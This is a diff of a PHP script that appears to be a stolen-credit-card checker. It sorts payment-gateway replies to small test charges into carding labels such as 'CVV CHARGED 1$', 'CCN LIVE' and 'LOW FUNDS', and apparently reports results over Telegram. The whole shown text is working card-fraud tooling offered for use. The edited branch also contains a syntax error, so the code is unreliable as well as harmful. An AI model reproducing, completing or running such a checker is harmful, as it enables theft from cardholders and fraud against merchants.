@@ -1,4 +1,3 @@
-
 <?php
 
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
@@ -155,45 +154,38 @@ sleep(3);
 
 // Response
 
-if (strpos($result2, "Thank you for your message.")){
-  $status = "Live 🟢";
-$response = "CVV CHARGED 1$ 🔥";
+if (strpos($result2, 'Thank you for your message.')){
+$response = 'CVV CHARGED 1$ 🔥';
 }
 
-elseif (strpos($result2, "security code is incorrect")){
-  $status = "Live 🟢";
-$response = "CCN LIVE ✅";
+elseif (strpos($result2, 'security code is incorrect')){
+$response = 'CCN LIVE ✅';
 }
 
-elseif (strpos($result2, "security code is invalid")){
-  $status = "Live 🟢";
-$response = "CCN LIVE ✅";
+elseif (strpos($result2, 'security code is invalid')){
+$response = 'CCN LIVE ✅';
 }
 
-elseif (strpos($result2, "insufficient funds")){
-  $status = "Live 🟢";
-$response = "LOW FUNDS ✅";
+elseif (strpos($result2, 'insufficient funds')){
+$response = 'LOW FUNDS ✅';
 }
 
-elseif (strpos($result2, "not support")){
-  $status = "Live 🟢";
-$response = "CVV LIVE ✅";
+elseif (strpos($result2, 'not support')){
+$response = 'CVV LIVE ✅';
 }
 
-elseif (strpos($result2, "Your card was declined.")){
-  $status = "Dead 🔴";
-$response = "GENERIC DECLINED ⭕";
+elseif (strpos($result2, 'Your card was declined')){
+$response = 'GENERIC DECLINED ⭕';
 }
 
-elseif (strpos($result2, "Your card number is incorrect.")){
-  $status = "Dead 🔴";
-$response = "INCORRECT NUMBER ⭕";
+elseif (strpos($result2, 'Your card number is incorrect')){
+$response = 'INCORRECT NUMBER ⭕';
 }
 
 else {
-      exit('$response = "ERROR ⭕"');
+$response = 'Error ⭕');
+}
 
-    }
 //--------SMS SENT SECTION----------------//
   global $mes_id, $chatId , $fullmes;
 $mainulstatus = "<b>Dead 🔴</b>";
